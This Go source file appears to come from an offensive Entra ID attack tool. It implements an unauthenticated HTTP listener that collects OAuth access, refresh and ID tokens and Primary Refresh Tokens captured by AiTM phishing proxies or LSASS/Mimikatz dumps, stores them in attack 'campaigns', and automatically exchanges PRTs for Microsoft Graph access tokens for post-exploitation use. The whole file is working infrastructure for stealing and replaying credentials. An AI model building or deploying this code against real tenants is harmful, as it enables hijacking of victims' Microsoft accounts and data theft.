package api

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bl4cksku11/entraith/internal/campaigns"
	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
	prtpkg "github.com/bl4cksku11/entraith/internal/modules/prt"
	"github.com/bl4cksku11/entraith/internal/store"
)

// TokenListener is a standalone HTTP server — separate from the operator console
// and from the generic webhook listener — that receives OAuth tokens pushed in
// from an external source (an AiTM / reverse proxy, a phishing landing page, or a
// manual curl drop) and ingests them into a campaign. Ingested tokens appear in
// the console and are immediately usable by every post-exploitation tool.
//
// The intake endpoint is intentionally unauthenticated on the wire — the whole
// point is that an external component POSTs to it — so bind it to a port/interface
// only the operator infrastructure can reach, or front it with a redirector. The
// start/stop/status controls live behind the authenticated /api/ router.
type TokenListener struct {
	mu        sync.Mutex
	server    *http.Server
	port      int
	running   bool
	startedAt time.Time
	received  int
	ingested  int

	logPath         string
	mgr             *campaigns.Manager
	db              *store.Store
	defaultCampaign string

	// DefaultPort is the configured fallback port used when a start request
	// does not specify one (config key listener.token_port; 8000 if unset).
	DefaultPort int
}

// NewTokenListener builds a stopped listener. Call Start(port) to bind it.
func NewTokenListener(mgr *campaigns.Manager, db *store.Store, logPath, defaultCampaign string) *TokenListener {
	return &TokenListener{
		mgr:             mgr,
		db:              db,
		logPath:         logPath,
		defaultCampaign: defaultCampaign,
		DefaultPort:     8000,
	}
}

// TokenListenerStatus is the JSON status returned by the control endpoints.
type TokenListenerStatus struct {
	Running         bool   `json:"running"`
	Port            int    `json:"port"`
	StartedAt       string `json:"started_at,omitempty"`
	Received        int    `json:"received"`
	Ingested        int    `json:"ingested"`
	LogPath         string `json:"log_path"`
	DefaultCampaign string `json:"default_campaign,omitempty"`
	DefaultPort     int    `json:"default_port"`
}

// tokenIntake is the accepted intake payload. Field names cover the common shapes
// emitted by AiTM proxies (evilginx-style JSON), PRT captures (LSASS/CloudAP,
// ROADtoken, AADInternals, Mimikatz), and hand-written drops.
type tokenIntake struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	CampaignID   string `json:"campaign_id"`
	TargetID     string `json:"target_id"`
	TargetEmail  string `json:"target_email"`
	Source       string `json:"source"`

	// ─── Primary Refresh Token intake ───────────────────────────────────────
	// A PRT is not a bearer token: it is stored in the PRT vault and used to
	// MINT access tokens (needs the session key). Send `prt` (or `prt_token`)
	// together with `session_key`. When `campaign_id` is present and a session
	// key is available, the PRT is also exchanged for a Graph access token that
	// is ingested into the campaign so it is usable in Graph Actions at once.
	PRT          string `json:"prt"`
	PRTToken     string `json:"prt_token"` // alias for prt
	SessionKey   string `json:"session_key"`
	DeviceCertID string `json:"device_cert_id"`
	Label        string `json:"label"`
	UPN          string `json:"upn"`
	TenantID     string `json:"tenant_id"`
	// Exchange controls (optional). ClientID/Resource default to Office/Graph.
	ExClientID string `json:"client_id"`
	ExResource string `json:"resource"`
}

// prt returns the PRT material from either the `prt` or `prt_token` field.
func (t tokenIntake) prt() string { return pickNonEmpty(t.PRT, t.PRTToken) }

// isPRT reports whether this payload carries a Primary Refresh Token.
func (t tokenIntake) isPRT() bool { return t.prt() != "" }

func (tl *TokenListener) SetDefaultCampaign(id string) {
	tl.mu.Lock()
	tl.defaultCampaign = id
	tl.mu.Unlock()
}

// Start binds the listener on the given port and serves the intake endpoints.
func (tl *TokenListener) Start(port int) error {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	if tl.running {
		return fmt.Errorf("token listener already running on port %d", tl.port)
	}
	if port <= 0 || port > 65535 {
		return fmt.Errorf("invalid port %d", port)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/token", tl.handleIntake)
	mux.HandleFunc("/", tl.handleIntake)
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"status":"ok"}`))
	})

	// Bind first so a port clash returns an immediate error instead of failing
	// silently inside the serving goroutine.
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return fmt.Errorf("port %d unavailable: %w", port, err)
	}

	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 15 * time.Second}
	tl.server = srv
	tl.port = port
	tl.running = true
	tl.startedAt = time.Now().UTC()

	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			tl.mu.Lock()
			tl.running = false
			tl.mu.Unlock()
			log.Printf("[token-listener] serve error: %v", err)
		}
	}()

	log.Printf("[token-listener] listening on :%d — POST /token → ingest into campaign token store", port)
	return nil
}

// Stop gracefully shuts the listener down.
func (tl *TokenListener) Stop() error {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	if !tl.running {
		return fmt.Errorf("token listener is not running")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := tl.server.Shutdown(ctx)
	tl.running = false
	tl.server = nil
	return err
}

// Status returns a snapshot of the listener state.
func (tl *TokenListener) Status() TokenListenerStatus {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	st := TokenListenerStatus{
		Running:         tl.running,
		Port:            tl.port,
		Received:        tl.received,
		Ingested:        tl.ingested,
		LogPath:         tl.logPath,
		DefaultCampaign: tl.defaultCampaign,
		DefaultPort:     tl.DefaultPort,
	}
	if tl.running {
		st.StartedAt = tl.startedAt.Format(time.RFC3339)
	}
	return st
}

// GetLogs returns the last n audit entries from the listener log.
func (tl *TokenListener) GetLogs(n int) []WebhookEntry {
	return readLogTail(tl.logPath, n)
}

// handleIntake parses one incoming token, ingests it, and writes a redacted
// audit entry. It is the only public surface of the standalone listener.
func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	tl.mu.Lock()
	tl.received++
	defCampaign := tl.defaultCampaign
	tl.mu.Unlock()

	intake, err := parseTokenIntake(r)
	if err != nil {
		tl.audit(r, tokenIntake{}, "", "", "parse_error:"+err.Error())
		writeJSON(w, 400, map[string]string{"error": err.Error()})
		return
	}

	campaignID := intake.CampaignID
	if campaignID == "" {
		campaignID = defCampaign
	}

	// A PRT follows its own path: it is stored in the PRT vault (complete), not
	// the campaign token store, and can then drive every PRT operation. A
	// campaign is optional here — it is only needed for the auto-exchange step.
	if intake.isPRT() {
		tl.ingestPRT(w, r, intake, campaignID)
		return
	}

	if campaignID == "" {
		tl.audit(r, intake, "", "", "no_campaign")
		writeJSON(w, 400, map[string]string{"error": "campaign_id required (no default campaign configured)"})
		return
	}

	res, err := tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
		AccessToken:  intake.AccessToken,
		RefreshToken: intake.RefreshToken,
		IDToken:      intake.IDToken,
		TokenType:    intake.TokenType,
		ExpiresIn:    intake.ExpiresIn,
		Scope:        intake.Scope,
		TargetID:     intake.TargetID,
		TargetEmail:  intake.TargetEmail,
		Source:       pickNonEmpty(intake.Source, "token-listener"),
	})
	if err != nil {
		tl.audit(r, intake, campaignID, "", "ingest_error:"+err.Error())
		writeJSON(w, 422, map[string]string{"error": err.Error()})
		return
	}

	tl.mu.Lock()
	tl.ingested++
	tl.mu.Unlock()
	tl.audit(r, intake, campaignID, res.TargetEmail, "ingested")

	writeJSON(w, 200, map[string]string{
		"status":       "ingested",
		"campaign_id":  campaignID,
		"target_id":    res.TargetID,
		"target_email": res.TargetEmail,
		"upn":          res.UserPrincipalName,
	})
}

// ingestPRT stores a captured Primary Refresh Token in the PRT vault (complete,
// encrypted at rest) so it shows up under the PRTs list and every PRT operation
// can use it (→ access token, → SSO cookie). When a campaign and a session key
// are available it also exchanges the PRT for a Graph access token and ingests
// that into the campaign, making the PRT usable in Graph Actions right away.
func (tl *TokenListener) ingestPRT(w http.ResponseWriter, r *http.Request, in tokenIntake, campaignID string) {
	prtID := fmt.Sprintf("prt-%d", time.Now().UnixNano())
	upn := pickNonEmpty(in.UPN, in.TargetEmail)
	label := in.Label
	if label == "" {
		label = "listener PRT"
		if upn != "" {
			label = "listener PRT — " + upn
		}
	}

	if err := tl.db.InsertPRT(store.PRTRow{
		ID:           prtID,
		Label:        label,
		DeviceCertID: in.DeviceCertID,
		PRTToken:     in.prt(),
		SessionKey:   in.SessionKey,
		TargetUPN:    upn,
		TenantID:     in.TenantID,
		CreatedAt:    time.Now().UTC(),
	}); err != nil {
		tl.audit(r, in, campaignID, upn, "prt_store_error:"+err.Error())
		writeJSON(w, 500, map[string]string{"error": "failed to store PRT: " + err.Error()})
		return
	}

	tl.mu.Lock()
	tl.ingested++
	tl.mu.Unlock()

	resp := map[string]interface{}{
		"status":          "prt_stored",
		"prt_id":          prtID,
		"label":           label,
		"has_session_key": in.SessionKey != "",
	}
	outcome := "prt_stored"

	// Optional auto-exchange: PRT → Graph access token → ingest into campaign.
	// Requires a session key (to sign the assertion) and a target campaign.
	if campaignID != "" && in.SessionKey != "" {
		clientID := pickNonEmpty(in.ExClientID, "d3590ed6-52b3-4102-aeff-aad2292ab01c") // Office
		resource := pickNonEmpty(in.ExResource, "https://graph.microsoft.com")
		p := &prtpkg.PRT{
			ID: prtID, Token: in.prt(), SessionKey: in.SessionKey,
			TargetUPN: upn, TenantID: in.TenantID,
		}
		raw, err := prtpkg.ToAccessToken(context.Background(), p, clientID, resource, "")
		if err != nil {
			resp["exchange_error"] = err.Error()
			outcome = "prt_stored;exchange_error"
		} else {
			var tok struct {
				AccessToken  string             `json:"access_token"`
				RefreshToken string             `json:"refresh_token"`
				IDToken      string             `json:"id_token"`
				TokenType    string             `json:"token_type"`
				ExpiresIn    devicecode.FlexInt `json:"expires_in"`
				Scope        string             `json:"scope"`
			}
			_ = json.Unmarshal(raw, &tok)
			if tok.AccessToken == "" {
				resp["exchange_error"] = "PRT exchange returned no access_token"
				outcome = "prt_stored;exchange_empty"
			} else if res, ierr := tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
				AccessToken:  tok.AccessToken,
				RefreshToken: tok.RefreshToken,
				IDToken:      tok.IDToken,
				TokenType:    tok.TokenType,
				ExpiresIn:    int(tok.ExpiresIn),
				Scope:        tok.Scope,
				TargetEmail:  upn,
				Source:       pickNonEmpty(in.Source, "prt-listener"),
			}); ierr != nil {
				resp["exchange_error"] = ierr.Error()
				outcome = "prt_stored;ingest_error"
			} else {
				resp["exchanged"] = true
				resp["campaign_id"] = campaignID
				resp["target_id"] = res.TargetID
				resp["target_email"] = res.TargetEmail
				outcome = "prt_stored;exchanged"
			}
		}
	}

	tl.audit(r, in, campaignID, upn, outcome)
	log.Printf("[token-listener] PRT stored id=%s upn=%s outcome=%s", prtID, upn, outcome)
	writeJSON(w, 200, resp)
}

// parseTokenIntake reads the token payload as JSON (default) or form-urlencoded,
// selected by Content-Type. Bodies are capped at 1 MiB.
func parseTokenIntake(r *http.Request) (tokenIntake, error) {
	var in tokenIntake
	ct := r.Header.Get("Content-Type")
	if strings.Contains(ct, "application/x-www-form-urlencoded") {
		r.Body = io.NopCloser(io.LimitReader(r.Body, 1<<20))
		if err := r.ParseForm(); err != nil {
			return in, fmt.Errorf("invalid form body")
		}
		in.AccessToken = r.PostForm.Get("access_token")
		in.RefreshToken = r.PostForm.Get("refresh_token")
		in.IDToken = pickNonEmpty(r.PostForm.Get("id_token"), r.PostForm.Get("idtoken"))
		in.TokenType = r.PostForm.Get("token_type")
		in.Scope = r.PostForm.Get("scope")
		if v := r.PostForm.Get("expires_in"); v != "" {
			in.ExpiresIn, _ = strconv.Atoi(v)
		}
		in.CampaignID = r.PostForm.Get("campaign_id")
		in.TargetID = r.PostForm.Get("target_id")
		in.TargetEmail = r.PostForm.Get("target_email")
		in.Source = r.PostForm.Get("source")
		in.PRT = r.PostForm.Get("prt")
		in.PRTToken = r.PostForm.Get("prt_token")
		in.SessionKey = r.PostForm.Get("session_key")
		in.DeviceCertID = r.PostForm.Get("device_cert_id")
		in.Label = r.PostForm.Get("label")
		in.UPN = r.PostForm.Get("upn")
		in.TenantID = r.PostForm.Get("tenant_id")
		in.ExClientID = r.PostForm.Get("client_id")
		in.ExResource = r.PostForm.Get("resource")
	} else {
		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		if len(body) == 0 {
			return in, fmt.Errorf("empty body")
		}
		if err := json.Unmarshal(body, &in); err != nil {
			return in, fmt.Errorf("invalid JSON body")
		}
	}
	if !in.isPRT() && in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
		return in, fmt.Errorf("payload must carry a prt, or at least one of access_token, refresh_token, id_token")
	}
	return in, nil
}

// audit writes a REDACTED entry to the listener log. Full token material is never
// written to the plaintext log — it lives encrypted-at-rest in the store. The log
// records provenance (source IP, outcome, which token types were present, and a
// short non-sensitive prefix) so an operator can trace intake without leaking
// usable secrets.
func (tl *TokenListener) audit(r *http.Request, in tokenIntake, campaignID, targetEmail, outcome string) {
	entry := map[string]interface{}{
		"campaign_id":     campaignID,
		"target_email":    targetEmail,
		"outcome":         outcome,
		"has_access":      in.AccessToken != "",
		"has_refresh":     in.RefreshToken != "",
		"has_id":          in.IDToken != "",
		"has_prt":         in.isPRT(),
		"has_session_key": in.SessionKey != "",
		"access_token":    redactToken(in.AccessToken),
		"refresh_token":   redactToken(in.RefreshToken),
		"id_token":        redactToken(in.IDToken),
		"prt":             redactToken(in.prt()),
		"session_key":     redactToken(in.SessionKey),
		"scope":           in.Scope,
		"source":          in.Source,
	}
	b, _ := json.Marshal(entry)
	writeWebhookLogEntryWithType(tl.logPath, r.RemoteAddr, r.Method, r.URL.Path, "json", b, "token_ingest")
}

// redactToken returns a short, non-usable fingerprint of a token: a prefix plus
// its length. Empty input yields "".
func redactToken(s string) string {
	if s == "" {
		return ""
	}
	prefix := s
	if len(prefix) > 12 {
		prefix = prefix[:12]
	}
	return fmt.Sprintf("%s…(len=%d)", prefix, len(s))
}

// pickNonEmpty returns the first non-empty string.
func pickNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}
